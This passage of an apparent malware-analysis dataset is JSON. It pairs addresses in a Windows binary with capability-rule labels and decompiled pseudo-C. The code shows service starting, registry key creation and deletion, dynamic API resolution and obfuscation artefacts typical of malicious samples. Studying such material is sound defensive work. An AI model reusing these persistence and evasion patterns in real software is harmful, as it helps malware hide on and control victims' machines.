false;\n    bVar22 = (in_EDX ^ uVar14 | 0x67) < '\\0';\n    *arg_8h = 0x6d;\n    uVar7 = in_EDX;\n    ppcVar20 = unaff_EDI;\n    uStack24 = in_EDX;\n    uStack20 = in_ECX;\n    if (!bVar22) {\n        uStack20 = in_ECX & 0xffff | in_EDX << 0x10;\n        if (bVar22) {\n            out(0xc4, in_EAX);\n            uStack20 = in_EDX << 0x10 | in_DS;\n            uVar7 = in_EDX & 0xffffff00 | in_EDX ^ in_ECX;\n            uStack24 = in_EDX & 0xffff0000 | in_SS;\n            ppcVar20 = unaff_EDI + 1;\n            *unaff_EDI = in_EAX;\n            bVar23 = SBORROW1(uVar14, *in_EAX);\n            bVar22 = uVar14 - *in_EAX < '\\0';\n            auStack28 = uVar7;\n        }\n    }\n    arg_8h[1] = 0xf0;\n    if ((!bVar23) && (bVar23)) {\n        LOCK();\n        arg_8h = 0x138b2633;\n        bVar23 = SCARRY4(in_EAX, 0x658f517f);\n        in_EAX = in_EAX + 0x658f517f;\n        bVar22 = in_EAX < 0;\n    }\n    arg_8h[2] = 0x20;\n    if ((bVar23 == bVar22) && (bVar23 != bVar22)) {\n        auStack28 = auStack28 & 0xffff0000 | in_ES;\n        arg_8h = arg_8h + -1;\n        puVar19 = ppcVar20 | &stack0xfffffffc;\n        ppcVar20 = puVar19 + 1;\n        *puVar19 = in_EAX;\n        uVar7 = uVar7 & 0xffffff00;\n        in_SS = auStack28._0_2_;\n    }\n    uVar4 = auStack28;\n    arg_8h[3] = 0x57;\n    arg_8h[4] = 0x8c;\n    arg_8h[5] = 0xcf;\n    bVar22 = (POPCOUNT(in_ECX >> 8 ^ unaff_EBX) & 1U) == 0;\n    arg_8h[6] = 0x11;\n    uVar5 = SUB42(auStack28, 0);\n    auStack28 = unaff_EBX;\n    if ((bVar22) || (auStack28 = ppcVar20,  !bVar22)) {\n        arg_8h[7] = 0x1b;\n        auStack28 = auStack28 & 0xffff | uVar4 << 0x10;\n    }\n    puVar16 = *0xc617b43a;\n    iVar3 = -*0x34a96d45;\n    puVar1 = &stack0xffffffe6 + iVar3;\n    *(&stack0xffffffe8 + iVar3) = in_ECX;\n    *(&stack0xffffffe4 + iVar3) = ppcVar20;\n    uVar9 = *(&stack0xffffffe8 + iVar3);\n    puVar19 = &stack0xffffffec;\n    *0x34a96cfd = 0xbe;\n    *(&stack0xffffffe8 + iVar3) = in_ECX & 0xffff0000 | uVar9;\n    bVar22 = (POPCOUNT((uVar9 - 1 & *(&stack0xffffffe4 + iVar3) | 0x61be) & 0xff) & 1U) != 0;\n    uVar11 = *(&stack0xffffffe8 + iVar3);\n    *0x34a96cfe = 0xfd;\n    if ((bVar22) && (!bVar22)) {\n        puVar15 = &stack0xffffffe8 + iVar3;\n        *(&stack0xffffffe8 + iVar3) = puVar16;\n        cVar2 = '\\x1e';\n        do {\n            puVar16 = puVar16 + -1;\n            puVar15 = puVar15 + -1;\n            *puVar15 = *puVar16;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        *(&stack0xffffff6c + iVar3) = &stack0xffffffe8 + iVar3;\n        uVar6 = in(0x78);\n        *0x34a96cfd = 0xbe;\n        *0x34a96cfe = 0xfd;\n        return CONCAT44(uVar4, uVar6);\n    }\n    *0x34a96cff = 0x79;\n    *(&stack0xffffffe8 + iVar3) = uVar7 + 1 & 0xffff0000 | *(&stack0xffffffea + iVar3);\n    uVar7 = *(&stack0xffffffe8 + iVar3);\n    *0x34a96d00 = 0x49;\n    *(&stack0xffffffea + iVar3) = uVar11;\n    *puVar1 = unaff_EBX;\n    *(&stack0xffffffe2 + iVar3) = 0x34a96cf5;\n    bVar22 = 0x34a97eff < uVar4;\n    uVar6 = *(&stack0xffffffe2 + iVar3);\n    uVar13 = *puVar1;\n    uVar9 = *(&stack0xffffffea + iVar3);\n    puVar21 = puVar16[2];\n    puVar21[0xc] = 0x40;\n    uVar14 = uVar7;\n    if (!bVar22) {\n        *(&stack0xffffffea + iVar3) = puVar21;\n        puVar21 = puVar21 & 0xffff0000 | *(&stack0xffffffea + iVar3);\n        if (bVar22) {\n            cVar2 = uVar14 - *puVar21;\n            *(&stack0xffffffe8 + iVar3) =\n                 (in_NT & 1) * 0x4000 | SBORROW1(uVar14, *puVar21) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                 (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4\n                 | uVar14 < *puVar21 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                 (in_AC & 1) * 0x40000;\n            *(&stack0xffffffe4 + iVar3) = 0x4026ba;\n            func_0x10188632();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    puVar21[0xd] = 0x95;\n    *(&stack0xffffffea + iVar3) = uVar7;\n    *puVar1 = uVar11 & 0xffff0000 | uVar9;\n    *(&stack0xffffffe2 + iVar3) = uVar6;\n    bVar23 = uVar14 == 1;\n    uVar6 = *(&stack0xffffffe2 + iVar3);\n    uVar11 = *puVar1;\n    uVar9 = *(&stack0xffffffea + iVar3);\n    puVar21[0xe] = 0x99;\n    if (!bVar22 && !bVar23) {\n        *(&stack0xffffffe8 + iVar3) = uVar6;\n        uVar6 = *(&stack0xffffffe8 + iVar3);\n        if (bVar22 || bVar23) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar21[0xf] = 0x71;\n    uVar14 = uVar9;\n    if (!bVar22) {\n        *(&stack0xffffffea + iVar3) = puVar21;\n        puVar21 = puVar21 & 0xffff0000 | *(&stack0xffffffea + iVar3);\n        if (bVar22) {\n            cVar2 = uVar14 - *puVar21;\n            *(&stack0xffffffe8 + iVar3) =\n                 (in_NT & 1) * 0x4000 | SBORROW1(uVar14, *puVar21) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                 (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4\n                 | uVar14 < *puVar21 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                 (in_AC & 1) * 0x40000;\n            *(&stack0xffffffe4 + iVar3) = 0x4026f2;\n            func_0x1018866a();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    puVar21[0x10] = 0x72;\n    if (!bVar22 && !bVar23) {\n        *(&stack0xffffffe8 + iVar3) = uVar6;\n        uVar6 = *(&stack0xffffffe8 + iVar3);\n        if (bVar22 || bVar23) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar21[0x11] = 0x45;\n    iVar10 = uVar11;\n    *(&stack0xffffffea + iVar3) = iVar10;\n    *(&stack0xffffffe8 + iVar3) = uVar5;\n    *(&stack0xffffffe4 + iVar3) = uVar7 & 0xffff0000 | uVar9;\n    uVar9 = iVar10 + 1;\n    bVar22 = ((uVar9 & 0xff | (uVar9 >> 8 & uVar14 + 2) << 8) & 0x7bc9) != 0;\n    uVar8 = *(&stack0xffffffe4 + iVar3);\n    uVar12 = *(&stack0xffffffe8 + iVar3);\n    uVar9 = *(&stack0xffffffea + iVar3);\n    puVar21[0x12] = 0xf7;\n    if (bVar22) {\n        *(&stack0xffffffea + iVar3) = uVar9;\n        uVar9 = *(&stack0xffffffea + iVar3);\n        if (!bVar22) goto code_r0x00402738;\n    }\n    puVar21[0x13] = 0x4f;\n    *(&stack0xffffffe8 + iVar3) = uVar8;\n    *(&stack0xffffffe4 + iVar3) = uVar11 & 0xffff0000 | uVar9;\n    *(&stack0xffffffe0 + iVar3) = uVar4 & 0xffff0000 | uVar12;\n    *(&stack0xffffffdc + iVar3) = uVar13;\n    *(&stack0xffffffd8 + iVar3) = puVar19 + iVar3;\n    *(&stack0xffffffd4 + iVar3) = puVar16;\n    *(&stack0xffffffd0 + iVar3) = uVar6;\n    puVar19 = &stack0xffffffcc;\n    *(puVar19 + iVar3) = puVar21;\ncode_r0x00402738:\n    *(puVar19 + iVar3 + -4) = in_SS;\n    *(puVar19 + iVar3 + -4) = 0x47;\n    uVar18 = *(puVar19 + iVar3);\n    iVar17 = *(puVar19 + iVar3 + 4);\n    uVar8 = *(puVar19 + iVar3 + 0x10);\n    uVar6 = *(puVar19 + iVar3 + 0x14);\n    uVar7 = *(iVar17 + 8);\n    *(uVar7 + 0x14) = 0x2e;\n    *(puVar19 + iVar3 + 0x1a) = uVar7;\n    *(puVar19 + iVar3 + 0x16) = uVar6;\n    *(puVar19 + iVar3 + 0x12) = uVar18;\n    uVar9 = *(puVar19 + iVar3 + 0x1a);\n    **(iVar17 + 0xc) = 0x15;\n    return CONCAT44(uVar8, (uVar7 >> 8 & 0xffff00) << 8 | uVar9);\n}\n",
        "token_count": 3467
    },
    "00402780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402780(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402530(&var_68h, &var_4h);\n    fcn.004015c0(&var_68h, var_4h, 0x4102b0, 0x10000);\n    *arg_8h = 0x4102b0;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 242
    },
    "004033f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040343a) overlaps instruction at (ram,0x00403439)\n// \n\nuint __cdecl fcn.004033f0(uint hSCManager, uint lpServiceName)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    ulong uVar10;\n    \n    uVar10 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    piVar8 = uVar10 >> 0x20;\n    uVar4 = uVar10;\n    bVar9 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 == 0) {\n        return 0;\n    }\n    if ((bVar9) || (!bVar9)) {\n        pcVar5 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(uVar4, 0, 0);\n    }\n    else {\n        *piVar8 = *piVar8 + -0x6a;\n        puVar1 = uVar4 - 1;\n        uVar2 = *puVar1;\n        uVar7 = uVar10 >> 0x20;\n        *puVar1 = *puVar1 + uVar7;\n        pcVar5 = sym.imp.ADVAPI32.dll_StartServiceA + CARRY1(uVar2, uVar7) + uVar4;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (pcVar5 == NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x420) {\n            iVar6 = (*pcVar3)();\n            if (iVar6 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar4);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar4);\n    return 1;\n}\n",
        "token_count": 501
    },
    "00403490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034fe) overlaps instruction at (ram,0x004034fd)\n// \n\nuint8_t * __cdecl fcn.00403490(uint8_t *arg_8h, char *arg_ch, uint *arg_10h, char *arg_14h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    char *in_ECX;\n    uint8_t *puVar3;\n    uint *puVar4;\n    char *unaff_EDI;\n    char *pcVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    \n    puVar3 = arg_ch + (arg_8h - arg_14h);\n    if (arg_14h == NULL) {\n        return arg_8h;\n    }\n    uVar1 = arg_8h - puVar3;\n    if (arg_8h < puVar3 || uVar1 == 0) {\n        do {\n            bVar6 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n            if ((bVar6) || (!bVar6)) {\n                in_ECX = in_ECX & 0xffffff00 | *arg_8h;\n                arg_ch = arg_ch & 0xffffff00 | *arg_10h;\n                pcVar5 = unaff_EDI;\n                if (*arg_8h == *arg_10h) {\n                    unaff_EDI = arg_10h + 1;\n                    arg_ch = arg_14h;\n                    goto code_r0x004034fd;\n                }\n            }\n            else {\n                puVar4 = arg_10h + 1;\n                out(*arg_10h, arg_ch);\n                do {\n                    cVar2 = arg_8h >> 8;\n                    in_AF = 9 < (arg_8h & 0xf) | in_AF;\n                    arg_8h = CONCAT31(CONCAT21(arg_8h >> 0x10, cVar2 - in_AF), -in_AF);\n                } while (in_AF || cVar2 == *arg_ch);\n                *(unaff_EDI + arg_ch * 2) = (*(unaff_EDI + arg_ch * 2) + 0x7b) - in_AF;\n                *(in_ECX + -0x76) = arg_8h;\n                arg_ch[0x75ca3a16] = arg_ch[0x75ca3a16] | in_ECX;\n                bVar6 = SCARRY4(arg_8h, -0x72ebaa75);\n                arg_8h = arg_8h + -0x72ebaa75;\n                bVar6 = bVar6 != SCARRY4(arg_8h, 0);\n                if (arg_8h == NULL || bVar6 != arg_8h < 0) {\n                    if (!bVar6) goto code_r0x00403500;\n                    arg_ch = arg_ch + -1;\n                    puVar3 = puVar3 & 0xffffff00 | puVar3 << (in_ECX & 0x1f);\n                    pcVar5 = unaff_EDI + 1;\n                    bVar6 = *puVar4 == *unaff_EDI;\n                }\n                else {\ncode_r0x004034fd:\n                    puVar4 = arg_8h + 1;\ncode_r0x00403500:\n                    in_ECX = arg_ch + -1;\n                    arg_ch = NULL;\n                    bVar6 = true;\n                    do {\n                        pcVar5 = unaff_EDI;\n                        if (in_ECX == NULL) break;\n                        in_ECX = in_ECX + -1;\n                        pcVar5 = unaff_EDI + 1;\n                        bVar6 = *puVar4 == *unaff_EDI;\n                        puVar4 = puVar4 + 1;\n                        unaff_EDI = pcVar5;\n                    } while (bVar6);\n                }\n                if (bVar6) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n            uVar1 = arg_8h - puVar3;\n            unaff_EDI = pcVar5;\n        } while (arg_8h < puVar3 || uVar1 == 0);\n    }\n    return NULL;\n}\n",
        "token_count": 952
    },
    "00403700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403795) overlaps instruction at (ram,0x00403792)\n// \n// WARNING: Removing unreachable block (ram,0x00403789)\n// WARNING: Removing unreachable block (ram,0x00403752)\n\nbool __cdecl fcn.00403700(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    ushort *in_EDX;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    ushort in_FPUControlWord;\n    uint var_4h;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *in_EDX = in_FPUControlWord;\n        (**0x420808)();\n        (**0x420808)(1);\n        return true;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    return iVar1 == 0;\n}\n",
        "token_count": 375
    },
    "004038c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403998) overlaps instruction at (ram,0x00403993)\n// \n// WARNING: Removing unreachable block (ram,0x00403958)\n// WARNING: Removing unreachable block (ram,0x004039c3)\n// WARNING: Removing unreachable block (ram,0x004039d0)\n\nuint __fastcall fcn.004038c0(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint8_t extraout_CL;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    uchar *puVar4;\n    code *unaff_ESI;\n    code *pcVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    puVar4 = &stack0xfffffffc;\n    if (*0x42080c != 0) {\n        return 1;\n    }\n    if ((*0x42080c < 0) || (*0x42080c >= 0)) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    }\n    else {\n        *(param_2 + 0x39) = *(param_2 + 0x39) + (param_1 >> 8);\n        uVar3 = unaff_EBX >> 8;\n        unaff_EBX = CONCAT11(uVar3 * '\\x02', unaff_EBX);\n        uVar2 = param_2 + 1U & 0xffffff00 | -CARRY1(uVar3, uVar3);\n        pcVar5 = unaff_ESI;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (uVar2 == 0) {\n        *0x4207fc = uVar2;\n        return 0;\n    }\n    *0x4207fc = uVar2;\n    if ((uVar2 < 1) || (0 < uVar2)) {\n        uVar2 = (*pcVar5)();\n    }\n    else {\n        *(uVar2 + 0x6839da56) = *(uVar2 + 0x6839da56) ^ extraout_CL;\n        uVar3 = unaff_EBX + 1 >> 8;\n        uVar2 = uVar2 & 0xffffff00 | -CARRY1(uVar3, uVar3);\n    }\n    if (uVar2 == 0) {\n        return 0;\n    }\n    uVar7 = (*pcVar1)();\n    *0x420804 = uVar7;\n    if (*0x420804 == 0) {\n        return 0;\n    }\n    bVar6 = (POPCOUNT(*0x420804 & 0xff) & 1U) == 0;\n    if ((bVar6) || (!bVar6)) {\n        uVar2 = (*pcVar5)();\n    }\n    else {\n        puVar4 = *0x6817b43a;\n        uVar2 = (uVar7 >> 0x20) + 1U & 0xffffff00;\n    }\n    *(puVar4 + -4) = uVar2;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    *0x420800 = (*pcVar1)();\n    if (*0x420800 == 0) {\n        return 0;\n    }\n    *0x4207f4 = (*pcVar1)();\n    if (*0x4207f4 != 0) {\n        *0x4207f8 = (*pcVar1)();\n        if (*0x4207f8 == 0) {\n            return 0;\n        }\n        *0x420808 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(puVar4 + -4), str._RAS);\n        if (*0x420808 != 0) {\n            if ((-1 < *0x420808) && (-1 >= *0x420808)) {\n                *(pcVar1 | puVar4) = *0x420808;\n            }\n            *0x42080c = 1;\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 991
    },
    "00404030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040c5) overlaps instruction at (ram,0x004040c1)\n// \n// WARNING: Removing unreachable block (ram,0x0040405a)\n// WARNING: Removing unreachable block (ram,0x0040403f)\n// WARNING: Removing unreachable block (ram,0x004040c5)\n\nuint fcn.00404030(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    uchar uVar2;\n    uint *puVar3;\n    char unaff_BL;\n    uint uVar4;\n    int32_t *unaff_EDI;\n    uint16_t in_ES;\n    char cVar5;\n    char cVar6;\n    uint32_t uVar7;\n    \n    puVar3 = (*_sym.imp.MSVCRT.dll_fopen)(param_1, param_2);\n    if (puVar3 != NULL) {\n        uVar1 = *puVar3;\n        *unaff_EDI = puVar3 + 1;\n        uVar4 = 0x8bb8ec44;\n        *0x8bb8ec96 = *0x8bb8ec96 + (uVar1 >> 0x1f) + (0x74 < *0x9750e2b5);\n        (*_sym.imp.MSVCRT.dll_fwrite)\n                  (*0x9750e2b5 & 0xffffff00 | *0x9750e2b5 + 0x8b, 1, &stack0xfffffffc, param_4, puVar3);\n        cVar6 = '\\0';\n        cVar5 = (unaff_BL + 1U ^ 0x50) < '\\0';\n        uVar7 = 0x8bb8ec44;\n        uVar2 = (*_sym.imp.MSVCRT.dll_fflush)(0x8bb8ec44);\n        if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n            uVar7 = uVar7 & 0xffff0000 | in_ES;\n            uVar4 = 0x8bb8ec43;\n            *(unaff_EDI | &stack0xfffffffd) = uVar2;\n        }\n        (*_sym.imp.MSVCRT.dll_fclose)(uVar4, uVar7);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 535
    },
    "00404280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00404280(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.004010d0();\n    puStack296 = 0x4042ca;\n    fcn.00401130(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x4042e4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x4042f7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x420810;\n    uStack312 = 0x420624;\n    uStack316 = 0x80000000;\n    uStack320 = 0x404317;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x420658;\n    uStack328 = 1;\n    uStack332 = 0x420810;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, str._v_KH, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, str.4u_SX, 1, str._O_N, 0x14);\n    return;\n}\n",
        "token_count": 645
    },
    "00404370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00404370(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00404990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404990(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint unaff_EBX;\n    bool bVar2;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00401180(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar2 = unaff_EBX >> 8 != '\\0';\n    *(iVar1 + 0x58) = arg_ch;\n    if ((bVar2) && (!bVar2)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401180(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 226
    },
    "00404a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a5e) overlaps instruction at (ram,0x00404a5d)\n// \n\nuint __cdecl fcn.00404a00(uint *arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    uint *hSCManager;\n    uint uVar1;\n    uint extraout_ECX;\n    char unaff_BL;\n    bool bVar2;\n    \n    bVar2 = SBORROW2(CONCAT11(((in_EAX >> 8) - unaff_BL) + 'M', in_EAX) & 0x26ae, 1);\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (!bVar2) {\n        if (bVar2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00401300(hSCManager, arg_8h);\n    if ((bVar2) || (uVar1 = extraout_ECX,  !bVar2)) {\n        uVar1 = arg_ch;\n    }\n    *arg_8h = *hSCManager;\n    uVar1 = fcn.00401e30(hSCManager + 1, arg_8h + 1, uVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager + 1);\n    return uVar1;\n}\n",
        "token_count": 338
    },
    "00404b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b8d) overlaps instruction at (ram,0x00404b89)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404b60(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    char cVar2;\n    char cVar3;\n    \n    if (arg_ch == 1) {\n        cVar3 = '\\0';\n        cVar2 = '\\0';\n        bVar1 = true;\n        fcn.00402940();\n        if ((!bVar1 && cVar3 == cVar2) && (bVar1 || cVar3 != cVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.004040e0();\n        if (*0x420814 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004013c0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 286
    },
    "00404c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00404c40(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint *puVar5;\n    char *extraout_ECX;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint8_t *puVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uint var_8h;\n    uchar auStack116 [4];\n    uint uStack112;\n    uint uStack108;\n    uchar auStack104 [4];\n    uchar auStack100 [4];\n    uchar auStack96 [44];\n    uint32_t uStack52;\n    ushort uStack48;\n    uint uStack40;\n    uint *puVar9;\n    \n    uVar2 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    bVar7 = uVar2 < 0x222c;\n    bVar8 = uVar2 == 0x222c;\n    puVar9 = NULL;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar8) && (bVar8)) {\n        if (bVar7 || unaff_EBX + 1 == 0) {\n            _pe_dos_header = &stack0xffffffe3;\n            pcVar4 = uVar2 + 1;\n            *extraout_ECX = *extraout_ECX + (pcVar4 >> 8);\n            *pcVar4 = *pcVar4 + pcVar4;\n            *(uVar2 + 0x65) = *(uVar2 + 0x65) + extraout_DL;\n            (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n            *0x420828 = 0xffffffff;\n            *0x42082c = 